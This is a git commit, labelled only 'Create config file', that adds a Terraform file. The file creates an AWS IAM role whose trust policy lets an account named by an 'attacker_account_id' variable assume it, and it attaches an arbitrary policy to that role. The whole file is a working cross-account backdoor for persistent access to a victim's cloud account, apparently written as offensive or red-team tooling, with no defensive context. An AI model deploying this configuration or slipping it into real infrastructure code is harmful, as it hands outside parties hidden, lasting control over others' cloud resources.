3959390c57180443e921e4f1d230b1b550b25fd0
iganbold <itgel.ganbold1@gmail.com>
2020-09-10 10:21:07 -0700

    Create config file

---
+++ main.tf
@@ -0,0 +1,20 @@
+data "aws_iam_policy_document" "this" {
+  statement {
+    effect  = "Allow"
+    actions = ["sts:AssumeRole"]
+    principals {
+      type        = "AWS"
+      identifiers = ["arn:aws:iam::${var.attacker_account_id}:root"]
+    }
+  }
+}
+
+resource "aws_iam_role" "this" {
+  name               = var.role_name
+  assume_role_policy = data.aws_iam_policy_document.this.json
+}
+
+resource "aws_iam_role_policy_attachment" "this" {
+  role       = aws_iam_role.this.name
+  policy_arn = var.policy_arn
+}
